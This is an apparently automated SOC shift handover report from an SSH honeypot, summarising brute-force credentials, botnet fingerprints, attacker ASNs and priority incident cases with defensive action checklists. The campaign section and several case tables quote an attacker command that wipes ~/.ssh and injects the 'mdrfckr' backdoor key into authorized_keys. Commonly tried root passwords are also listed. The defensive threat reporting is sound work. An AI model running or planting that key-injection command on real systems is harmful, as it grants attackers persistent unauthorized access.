# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-12 |
| **Generated At** | 2026-06-12T10:20:18Z |
| **Shift Time** | 10:20 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **490** |
| Confirmed Threats | **468** |
| False Positives Filtered | **22** (4.5%) |
| Unique Attacker IPs | **70** |
| Countries of Origin | **21** |
| High Severity Cases | **49** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **441** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **188** |
| Unique Credential Pairs | **119** |
| Unique Usernames | **87** |
| Unique Passwords | **92** |
| Successful Auth Pairs | **34** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 49 |
| `345gs5662d34` | 22 |
| `admin` | 7 |
| `GET / HTTP/1.0` | 3 |
| `OPTIONS / HTTP/1.0` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 22 |
| `3245gs5662d34` | 22 |
| `123456` | 19 |
| `` | 19 |
| `123` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 22 |
| `root` | `3245gs5662d34` | 22 |
| `admin` | `` | 4 |
| `GET / HTTP/1.0` | `` | 3 |
| `OPTIONS / HTTP/1.0` | `` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456as` | `211.46.188.16` | 2026-06-12T05:11:14 |
| `root` | `3245gs5662d34` | `211.46.188.16` | 2026-06-12T05:11:17 |
| `root` | `root999` | `62.183.82.70` | 2026-06-12T05:40:13 |
| `root` | `Mima@2026` | `188.244.115.211` | 2026-06-12T05:56:26 |
| `root` | `3245gs5662d34` | `188.244.115.211` | 2026-06-12T05:56:31 |
| `root` | `Admin!2026` | `188.244.115.211` | 2026-06-12T06:03:02 |
| `root` | `!23QweAsdZxc` | `188.244.115.211` | 2026-06-12T06:07:21 |
| `root` | `@qwer2025` | `188.244.115.211` | 2026-06-12T06:20:19 |
| `root` | `QWEqwe123.` | `188.244.115.211` | 2026-06-12T06:24:39 |
| `root` | `930920` | `218.248.19.102` | 2026-06-12T07:31:16 |
| `root` | `Wt123456` | `107.150.105.116` | 2026-06-12T07:31:46 |
| `root` | `3245gs5662d34` | `107.150.105.116` | 2026-06-12T07:31:52 |
| `root` | `Test@2020` | `103.76.120.198` | 2026-06-12T07:39:45 |
| `root` | `3245gs5662d34` | `103.76.120.198` | 2026-06-12T07:39:50 |
| `root` | `Wf5Ic*ZgYK2%K47XfNU&GJp4KHfLAn6m` | `103.30.40.129` | 2026-06-12T07:41:02 |
| `root` | `GJ123456@` | `178.176.224.83` | 2026-06-12T07:41:16 |
| `root` | `3245gs5662d34` | `178.176.224.83` | 2026-06-12T07:41:20 |
| `root` | `123456ab` | `49.124.151.52` | 2026-06-12T07:57:13 |
| `root` | `Ls123456` | `106.12.108.64` | 2026-06-12T08:05:42 |
| `root` | `chocolate` | `8.137.111.249` | 2026-06-12T09:07:50 |
| `root` | `3245gs5662d34` | `8.137.111.249` | 2026-06-12T09:07:53 |
| `root` | `He123456@` | `102.220.87.78` | 2026-06-12T09:21:27 |
| `root` | `3245gs5662d34` | `102.220.87.78` | 2026-06-12T09:21:33 |
| `root` | `qwertyuiop..` | `102.220.87.78` | 2026-06-12T09:23:48 |
| `root` | `k0s0ng` | `102.220.87.78` | 2026-06-12T09:28:34 |
| `root` | `Qwer123Qwer` | `102.220.87.78` | 2026-06-12T09:30:49 |
| `root` | `qwer1234.` | `102.220.87.78` | 2026-06-12T09:33:07 |
| `root` | `123qweASD!@#` | `102.220.87.78` | 2026-06-12T09:35:19 |
| `root` | `pass2026` | `102.220.87.78` | 2026-06-12T09:44:43 |
| `root` | `AaBbCc123!@#` | `102.220.87.78` | 2026-06-12T09:46:58 |
| `root` | `12#$qwer` | `102.220.87.78` | 2026-06-12T09:53:52 |
| `root` | `Li123456789` | `102.220.87.78` | 2026-06-12T10:05:18 |
| `root` | `qwerty123123` | `102.220.87.78` | 2026-06-12T10:09:50 |
| `root` | `wasd` | `102.220.87.78` | 2026-06-12T10:12:10 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **490** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 146 |
| Go SSH scanner | 28 |
| Nmap scanner | 14 |
| OpenSSH | 7 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 134 | 13 |
| `e788c657d1a2...` | Mirai/variant | 12 | 1 |
| `0a07365cc01f...` | Generic scanner | 11 | 1 |
| `03a80b21afa8...` | Modern SSH client | 10 | 4 |
| `acaa53e0a7d7...` | Mirai/variant | 7 | 7 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 134 | 13 | Mirai/variant |
| `95420f9d932d...` | Go SSH scanner | 13 | 3 | — |
| `e788c657d1a2...` | Nmap scanner | 12 | 1 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 11 | 1 | Generic scanner |
| `03a80b21afa8...` | libssh | 10 | 4 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 7 | 7 | Mirai/variant |
| `b4b8ae3d7241...` | libssh | 2 | 1 | Mirai/variant |
| `a20aced7c982...` | Nmap scanner | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 24 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.76.120.198`, `178.176.224.83`, `103.30.40.129`, `8.137.111.249`, `188.244.115.211`, `106.12.108.64`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **70** |
| Unique ASNs | **46** |
| High-Risk ASNs | **38** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS22773` | Cox Communications Inc. | 5 | MEDIUM |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 4 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS16509` | Amazon.com, Inc. | 3 | HIGH |
| `AS138423` | CMPak Limited | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (49)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e736805cf775

| Field | Detail |
|---|---|
| **Source IP** | `211.46.188[.]16` |
| **First Seen** | 2026-06-12 05:11 |
| **Last Seen** | 2026-06-12 05:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 05:11:13` | `cowrie.session.connect` |
| `2026-06-12 05:11:13` | `cowrie.client.version` |
| `2026-06-12 05:11:13` | `cowrie.client.kex` |
| `2026-06-12 05:11:14` | `cowrie.login.success` |
| `2026-06-12 05:11:14` | `cowrie.session.params` |
| `2026-06-12 05:11:14` | `cowrie.command.input` |
| `2026-06-12 05:11:14` | `cowrie.command.failed` |
| `2026-06-12 05:11:14` | `cowrie.log.closed` |
| `2026-06-12 05:11:15` | `cowrie.session.params` |
| `2026-06-12 05:11:15` | `cowrie.command.input` |
| `2026-06-12 05:11:15` | `cowrie.session.file_download` |
| `2026-06-12 05:11:15` | `cowrie.log.closed` |
| `2026-06-12 05:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.46.188[.]16` to AbuseIPDB if not already reported
- [ ] Block `211.46.188[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-839ff53e1067

| Field | Detail |
|---|---|
| **Source IP** | `211.46.188[.]16` |
| **First Seen** | 2026-06-12 05:11 |
| **Last Seen** | 2026-06-12 05:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 05:11:17` | `cowrie.session.connect` |
| `2026-06-12 05:11:17` | `cowrie.client.version` |
| `2026-06-12 05:11:17` | `cowrie.client.kex` |
| `2026-06-12 05:11:17` | `cowrie.login.success` |
| `2026-06-12 05:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.46.188[.]16` to AbuseIPDB if not already reported
- [ ] Block `211.46.188[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a77f014c3ca

| Field | Detail |
|---|---|
| **Source IP** | `62.183.82[.]70` |
| **First Seen** | 2026-06-12 05:40 |
| **Last Seen** | 2026-06-12 05:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 05:40:11` | `cowrie.session.connect` |
| `2026-06-12 05:40:12` | `cowrie.client.version` |
| `2026-06-12 05:40:12` | `cowrie.client.kex` |
| `2026-06-12 05:40:13` | `cowrie.login.success` |
| `2026-06-12 05:40:13` | `cowrie.direct-tcpip.request` |
| `2026-06-12 05:40:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.183.82[.]70` to AbuseIPDB if not already reported
- [ ] Block `62.183.82[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b18f20915c06

| Field | Detail |
|---|---|
| **Source IP** | `188.244.115[.]211` |
| **First Seen** | 2026-06-12 05:56 |
| **Last Seen** | 2026-06-12 05:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 05:56:24` | `cowrie.session.connect` |
| `2026-06-12 05:56:24` | `cowrie.client.version` |
| `2026-06-12 05:56:25` | `cowrie.client.kex` |
| `2026-06-12 05:56:26` | `cowrie.login.success` |
| `2026-06-12 05:56:26` | `cowrie.session.params` |
| `2026-06-12 05:56:26` | `cowrie.command.input` |
| `2026-06-12 05:56:26` | `cowrie.command.failed` |
| `2026-06-12 05:56:27` | `cowrie.log.closed` |
| `2026-06-12 05:56:27` | `cowrie.session.params` |
| `2026-06-12 05:56:27` | `cowrie.command.input` |
| `2026-06-12 05:56:27` | `cowrie.session.file_download` |
| `2026-06-12 05:56:27` | `cowrie.log.closed` |
| `2026-06-12 05:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.244.115[.]211` to AbuseIPDB if not already reported
- [ ] Block `188.244.115[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75048e7b22ea

| Field | Detail |
|---|---|
| **Source IP** | `188.244.115[.]211` |
| **First Seen** | 2026-06-12 05:56 |
| **Last Seen** | 2026-06-12 05:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 05:56:30` | `cowrie.session.connect` |
| `2026-06-12 05:56:30` | `cowrie.client.version` |
| `2026-06-12 05:56:30` | `cowrie.client.kex` |
| `2026-06-12 05:56:31` | `cowrie.login.success` |
| `2026-06-12 05:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.244.115[.]211` to AbuseIPDB if not already reported
- [ ] Block `188.244.115[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b013c3b74100

| Field | Detail |
|---|---|
| **Source IP** | `188.244.115[.]211` |
| **First Seen** | 2026-06-12 06:03 |
| **Last Seen** | 2026-06-12 06:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 06:03:01` | `cowrie.session.connect` |
| `2026-06-12 06:03:01` | `cowrie.client.version` |
| `2026-06-12 06:03:01` | `cowrie.client.kex` |
| `2026-06-12 06:03:02` | `cowrie.login.success` |
| `2026-06-12 06:03:02` | `cowrie.session.params` |
| `2026-06-12 06:03:02` | `cowrie.command.input` |
| `2026-06-12 06:03:02` | `cowrie.command.failed` |
| `2026-06-12 06:03:03` | `cowrie.log.closed` |
| `2026-06-12 06:03:03` | `cowrie.session.params` |
| `2026-06-12 06:03:03` | `cowrie.command.input` |
| `2026-06-12 06:03:03` | `cowrie.session.file_download` |
| `2026-06-12 06:03:03` | `cowrie.log.closed` |
| `2026-06-12 06:03:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.244.115[.]211` to AbuseIPDB if not already reported
- [ ] Block `188.244.115[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25348fff1f2f

| Field | Detail |
|---|---|
| **Source IP** | `188.244.115[.]211` |
| **First Seen** | 2026-06-12 06:03 |
| **Last Seen** | 2026-06-12 06:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 06:03:06` | `cowrie.session.connect` |
| `2026-06-12 06:03:06` | `cowrie.client.version` |
| `2026-06-12 06:03:06` | `cowrie.client.kex` |
| `2026-06-12 06:03:07` | `cowrie.login.success` |
| `2026-06-12 06:03:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.244.115[.]211` to AbuseIPDB if not already reported
- [ ] Block `188.244.115[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18882ef241a6

| Field | Detail |
|---|---|
| **Source IP** | `188.244.115[.]211` |
| **First Seen** | 2026-06-12 06:07 |
| **Last Seen** | 2026-06-12 06:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 06:07:20` | `cowrie.session.connect` |
| `2026-06-12 06:07:20` | `cowrie.client.version` |
| `2026-06-12 06:07:21` | `cowrie.client.kex` |
| `2026-06-12 06:07:21` | `cowrie.login.success` |
| `2026-06-12 06:07:22` | `cowrie.session.params` |
| `2026-06-12 06:07:22` | `cowrie.command.input` |
| `2026-06-12 06:07:22` | `cowrie.command.failed` |
| `2026-06-12 06:07:22` | `cowrie.log.closed` |
| `2026-06-12 06:07:23` | `cowrie.session.params` |
| `2026-06-12 06:07:23` | `cowrie.command.input` |
| `2026-06-12 06:07:23` | `cowrie.session.file_download` |
| `2026-06-12 06:07:23` | `cowrie.log.closed` |
| `2026-06-12 06:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.244.115[.]211` to AbuseIPDB if not already reported
- [ ] Block `188.244.115[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15f4a536921b

| Field | Detail |
|---|---|
| **Source IP** | `188.244.115[.]211` |
| **First Seen** | 2026-06-12 06:07 |
| **Last Seen** | 2026-06-12 06:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 06:07:26` | `cowrie.session.connect` |
| `2026-06-12 06:07:26` | `cowrie.client.version` |
| `2026-06-12 06:07:26` | `cowrie.client.kex` |
| `2026-06-12 06:07:27` | `cowrie.login.success` |
| `2026-06-12 06:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.244.115[.]211` to AbuseIPDB if not already reported
- [ ] Block `188.244.115[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb011292c897

| Field | Detail |
|---|---|
| **Source IP** | `188.244.115[.]211` |
| **First Seen** | 2026-06-12 06:20 |
| **Last Seen** | 2026-06-12 06:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 06:20:18` | `cowrie.session.connect` |
| `2026-06-12 06:20:18` | `cowrie.client.version` |
| `2026-06-12 06:20:18` | `cowrie.client.kex` |
| `2026-06-12 06:20:19` | `cowrie.login.success` |
| `2026-06-12 06:20:19` | `cowrie.session.params` |
| `2026-06-12 06:20:19` | `cowrie.command.input` |
| `2026-06-12 06:20:19` | `cowrie.command.failed` |
| `2026-06-12 06:20:20` | `cowrie.log.closed` |
| `2026-06-12 06:20:20` | `cowrie.session.params` |
| `2026-06-12 06:20:20` | `cowrie.command.input` |
| `2026-06-12 06:20:20` | `cowrie.session.file_download` |
| `2026-06-12 06:20:20` | `cowrie.log.closed` |
| `2026-06-12 06:20:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.244.115[.]211` to AbuseIPDB if not already reported
- [ ] Block `188.244.115[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-928b387a4cee

| Field | Detail |
|---|---|
| **Source IP** | `188.244.115[.]211` |
| **First Seen** | 2026-06-12 06:20 |
| **Last Seen** | 2026-06-12 06:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 06:20:23` | `cowrie.session.connect` |
| `2026-06-12 06:20:23` | `cowrie.client.version` |
| `2026-06-12 06:20:24` | `cowrie.client.kex` |
| `2026-06-12 06:20:25` | `cowrie.login.success` |
| `2026-06-12 06:20:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.244.115[.]211` to AbuseIPDB if not already reported
- [ ] Block `188.244.115[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-624f149bc767

| Field | Detail |
|---|---|
| **Source IP** | `188.244.115[.]211` |
| **First Seen** | 2026-06-12 06:24 |
| **Last Seen** | 2026-06-12 06:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 06:24:38` | `cowrie.session.connect` |
| `2026-06-12 06:24:38` | `cowrie.client.version` |
| `2026-06-12 06:24:38` | `cowrie.client.kex` |
| `2026-06-12 06:24:39` | `cowrie.login.success` |
| `2026-06-12 06:24:39` | `cowrie.session.params` |
| `2026-06-12 06:24:39` | `cowrie.command.input` |
| `2026-06-12 06:24:39` | `cowrie.command.failed` |
| `2026-06-12 06:24:40` | `cowrie.log.closed` |
| `2026-06-12 06:24:40` | `cowrie.session.params` |
| `2026-06-12 06:24:40` | `cowrie.command.input` |
| `2026-06-12 06:24:40` | `cowrie.session.file_download` |
| `2026-06-12 06:24:40` | `cowrie.log.closed` |
| `2026-06-12 06:24:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.244.115[.]211` to AbuseIPDB if not already reported
- [ ] Block `188.244.115[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

